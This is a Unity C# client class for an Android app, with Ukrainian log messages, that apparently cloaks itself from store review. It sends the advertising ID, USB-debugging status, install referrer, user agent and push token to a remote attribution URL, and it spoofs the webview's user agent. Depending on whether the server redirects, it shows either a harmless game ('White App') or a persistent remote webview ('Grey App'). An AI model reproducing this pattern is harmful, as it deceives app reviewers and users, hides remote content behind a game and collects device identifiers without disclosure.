using System;
using System.Collections.Generic;
using AndroidInstallReferrer;
using Core;
using Octopus.SceneLoaderCore.Helpers;
using UnityEngine;
using UnityEngine.SceneManagement;
using System.Text.RegularExpressions;

namespace Octopus.Client
{
    public class Client : MonoBehaviour
    {
        public static Client Instance;
        
        public bool isIgnoreFirstRunApp;

        private List<Request> requests = new List<Request>();
        
        private string installReferrer;
        
        private UniWebView _webView;
        
        private string generatedURL;
        
        protected void Awake()
        {
            if (Instance != null)
            {
                Destroy(gameObject);
                
                return;
            }
            
            Instance = this;
        }
        
        public void Initialize()
        {
            Log("!!! Client -> Initialize");
            
            if(GameSettings.HasKey(Constants.IsFirstRunApp) && !isIgnoreFirstRunApp)
            {
                Log("Повторно запустили додаток");
                
                SwitchToScene();
            }
            else 
            {
                Log("Перший раз запустили додаток");
                
                GameSettings.Init();
                
                GetReferrer();
            }
        }

        private void Send(Request request)
        {
            Log($"Send Request {request.GetType()}");
            
            requests.Remove(request);

            StartCoroutine(SenderRequest.Send(request, CheckRequests));
        }

        private void CheckRequests()
        {
            Log("!!! Client -> CheckRequests");
            
            if (requests.Count != 0)
            {
                Send(requests[0]);
            }
            else
            {
                SwitchToScene();
            }
        }
        
        private void SwitchToScene()
        {
            Log("SwitchToScene");
            
            var scene = CheckReceiveUrlIsNullOrEmpty() ? SceneLoader.Instance.mainScene : SceneLoader.Instance.webviewScene;
            
            if (SceneLoader.Instance)
            {
                SceneLoader.Instance.SwitchToScene(scene);
            }
            else
            {
                SceneManager.LoadScene(scene);
            }
        }

        private bool CheckReceiveUrlIsNullOrEmpty()
        {
            var receiveUrl = GameSettings.GetValue(Constants.ReceiveUrl, "");
            
            Log($"CheckStartUrlIsNullOrEmpty receiveUrl={receiveUrl}");

            return String.IsNullOrEmpty(receiveUrl);
        }

        private void Log(string message)
        {
            ConsoleReporter.Info($"@@@ Client ->: {message}", new Color(0.2f, 0.4f, 0.9f));
        }
        
        private void GetReferrer(float timeout = 10f)
        {
            Log("⏳ Очікуємо реферер...");
            
#if UNITY_EDITOR
            Log("🎮 Запуск у редакторі, використовуємо тестовий реферер.");
            
            OnGetData(new InstallReferrerData(
                "utm_source=google&utm_medium=cpc&utm_term=1&utm_content=2&utm_campaign=3&anid=admob", 
                "1.0", false, DateTime.Now, DateTime.Now, DateTime.Now, DateTime.Now));
#else
            InstallReferrer.GetReferrer(OnGetData);
#endif
        }
        
        private void OnGetData(InstallReferrerData data)
        {
            if (Settings.UseMocInstallReferrer())
            {
                installReferrer = Uri.EscapeDataString(Settings.MocInstallReferrer());
                
                Debug.Log($"☑️ MocInstallReferrer: {installReferrer}");
            }
            else
            {
                if (data.IsSuccess)
                {
                    installReferrer = Uri.EscapeDataString(data.InstallReferrer);
                
                    Debug.Log($"✅ installReferrer: {installReferrer}");
                }
                else
                {
                    installReferrer = null;
                    
                    Debug.Log($"❌InstallReferrer Error: {data.Error}");
                }
            }
            
            Log("🌍 Відкриваємо URL...");

            OpenURL();
        }
        
        private void OpenURL()
        {
            GenerateURL();
            
            CheckWebview();
            
            Subscribe();
            
            {
                var agent = _webView.GetUserAgent();
                
                GameSettings.SetValue(Constants.DefaultUserAgent, agent);

                Log($"💁 GetUserAgent: {agent}");
                
                agent = agent.Replace("; wv", "");
                
                agent = Regex.Replace(agent, @"Version/\d+\.\d+", "");

                Log($"💁 SetUserAgent: {agent}");
                
                //_webView.SetHeaderField("Accept-Language", "en-US,en;q=0.9,uk;q=0.8");
                
                _webView.SetUserAgent(agent);
            }
            
            _webView.Load(generatedURL);
            
            _webView.OnShouldClose += (view) => false;
        }

        private void GenerateURL()
        {
            
            generatedURL = $"{Settings.GetAttributionUrl()}?" +
                           $"{Settings.GetGadIdKey()}={GameSettings.GetValue(Constants.GAID)}" +
                           $"&{Settings.GetExtraParam2()}={(USBInstallationChecker.IsUsbDebuggingEnabled() ? 1 : 0)}" +
                           $"&{Settings.GetReferrerKey()}={installReferrer}" +
                           //$"&{Settings.GetPushNotificationTag()}={1}" +
                           $"&{Settings.GetCustomUserAgent()}={GameSettings.GetValue(Constants.DefaultUserAgent)}" +
                           $"&{Settings.GetFcmTokenKey()}={GameSettings.GetValue(Constants.FcmTokenKey)}" +
                           $"";
            
            Log($"📌 generatedURL: {generatedURL}");
        }

        private void CheckWebview()
        {
            if (_webView == null)
            {
                CreateWebView();
            }
        }
        
        private void CreateWebView()
        {
            var webViewGameObject = new GameObject("UniWebView");

            _webView = webViewGameObject.AddComponent<UniWebView>();
        }
        
        private void Subscribe()
        {
            Log($"📥Subscribe");
            
            _webView.OnPageFinished += OnPageFinished;
            _webView.OnPageStarted += OnPageStarted;
            _webView.OnLoadingErrorReceived += OnLoadingErrorReceived;
        }
        
        private void UnSubscribe()
        {
            Log($"📤UnSubscribe");
            
            _webView.OnPageFinished -= OnPageFinished;
            _webView.OnPageStarted -= OnPageStarted;
            _webView.OnLoadingErrorReceived -= OnLoadingErrorReceived;
        }
        
        private void OnPageStarted(UniWebView webview, string url)
        {
            Log($"### 🎬OnPageStarted UniWebView: url={url} / _webView.Url={_webView.Url}");
        }
        
        private void OnPageFinished(UniWebView view, int statusCode, string url)
        {
            Log($"### 🏁OnPageFinished: url={url} / _webView.Url={_webView.Url}");
            
            var uriPage = new Uri(url);
            var uriDomen = new Uri(generatedURL);
            
            var hostPage = uriPage.Host.ToLower();
            var hostDomen = uriDomen.Host.ToLower();
            
            GameSettings.SetFirstRunApp();
            
            Log($"🔍 Перевірка URL: hostPage = {hostPage}, hostDomen = {hostDomen}");
            
            if (hostPage == hostDomen)
            {
                Log($"White App");

                FirebaseInit.DeleteFcmToken();

                PlayerPrefs.GetInt(Constants.IsOnlyWhiteRunApp, 1);
                PlayerPrefs.Save();
                
                SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.mainScene);
            }
            else
            {
                Log($"Grey App");
                
                GameSettings.SetValue(Constants.ReceiveUrl, url);
                
                SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.webviewScene);
            }

            UnSubscribe();
        }
        
        private void OnLoadingErrorReceived(UniWebView view, int errorCode, string errorMessage, UniWebViewNativeResultPayload payload)
        {
            Log($"### 💀OnLoadingErrorReceived: errorCode={errorCode}, _webView.Url={_webView.Url}, errorMessage={errorMessage}");
        
            GameSettings.SetValue(Constants.ReceiveUrl, _webView.Url);
            
            SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.webviewScene);
            
            UnSubscribe();
        }
    }
}
